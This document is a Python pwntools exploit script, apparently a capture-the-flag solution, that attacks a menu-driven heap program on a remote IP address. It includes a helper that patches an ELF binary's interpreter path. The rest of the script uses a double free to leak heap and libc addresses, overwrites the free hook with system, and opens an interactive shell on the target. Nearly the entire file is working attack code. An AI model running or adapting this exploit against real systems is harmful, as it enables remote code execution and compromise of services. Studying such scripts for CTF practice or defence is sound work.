#!usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
import sys, os
def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)
#example
debug = 0
if debug : 
	elf = change_ld('./chall', './ld-2.29.so')
	p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
	e = ELF('./libc.so.6')
	log.info('PID:'+str(proc.pidof(p)[0]))
	context.log_level = 'debug'
	raw_input('wait')
else :
	p = remote('34.92.96.238',10001)
	e = ELF('./libc.so.6')
	context.log_level = 'debug'
#raw_input(' ')
def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))


def add(size,name,call):
	p.recvuntil('choice:')
	p.sendline('1')
	p.recvuntil('name')
	p.sendline(str(size))
	p.recvuntil('name:')
	p.send(name)
	p.recvuntil('call:')
	p.send(call)

def show(idx):
	p.recvuntil('choice:')
	p.sendline('2')
	p.recvuntil('index:')
	p.sendline(str(idx))

def delete(idx):
	p.recvuntil('choice:')
	p.sendline('4')
	p.recvuntil('index:')
	p.sendline(str(idx))

#double free
for i in range(10):
	add(0x60,'/bin/sh\00\n','lrh\n')
for i in range(8):
	delete(i)
delete(8)
delete(7)


#leak libc
for i in range(8):
	add(0x90,'lrh\n','lrh\n')
add(0x90,'asd\n','asd\n') # idx 18
for i in range(8):
	delete(i+10)
show(15)
p.recvuntil('name:\n')
heap = p.recvuntil('\n',drop = True)
heap = heap.ljust(8,'\x00')
heap = u64(heap)
lg('heap:',heap)
heap_base = heap - 0xb20
heap_aim = heap_base + 0x790

show(17)
p.recvuntil('name:\n')
libc = p.recvuntil('\n',drop = True)
libc = libc.ljust(8,'\x00')
libc = u64(libc)
lg('libc:',libc)
libc_base = libc - 0x3b1ca0
lg('libc_base:',libc_base)
free_chunk = libc_base + 0x3b38b5
malloc_chunk = libc_base + 0x3b1c0d
system = libc_base + e.symbols['system']
lg('system:',system)


#modify free_hook or malloc_hook
for i in range(7):
	add(0x60,'/bin/sh\00\n','lrh\n')
#gdb.attach(p,'b * 0x555555554f3c')
add(0x60,p64(free_chunk)+'\n','asd\n')
add(0x60,'/bin/sh\00\n','lrh\n')
add(0x60,'/bin/sh\00\n','lrh\n')
add(0x60,'a'*0x13+p64(system),'asd\n')




#gdb.attach(p,'b * 0x555555554f3c')

show(9)  # 9->name = /bin/sh   heap_addr = heap_aim


p.interactive()


















